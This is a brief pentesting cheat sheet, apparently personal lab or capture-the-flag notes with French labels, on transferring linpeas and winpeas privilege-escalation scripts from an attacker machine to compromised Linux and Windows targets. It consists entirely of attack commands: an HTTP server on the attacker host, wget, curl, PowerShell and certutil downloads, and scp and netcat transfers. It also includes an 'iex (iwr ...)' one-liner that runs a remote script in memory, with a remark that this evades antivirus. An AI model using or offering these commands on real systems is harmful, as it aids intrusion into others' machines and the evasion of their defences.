
```bash
(hacker)
python3 -m http.server 80

(cible linux)
wget http://10.10.14.5/linpeas.sh   
curl http://10.10.14.5/linpeas.sh -o linpeas.sh

(cible windows)
iwr -uri http://<ip_hacker>/winpeas.exe -OutFile winpeas.exe

iex (iwr -UseBasicParsing http://<ip_hacker>/run_peas.ps1) <- plus discret pour les AV car lancer le script en memoir avec iex au lieu décrire un exe sur le disque  

certutil.exe -urlcache -f http://ip_hacker/winpeas.exe winpeas.exe

==================================================================

(hacker)
scp linpeas.sh user@<ip_cible>:/tmp/

==================================================================

(cible)
nc -l -p 1234 > linpeas.sh

(hacker)
nc -w 3 <ip_cible> 1234 < linpeas.sh

```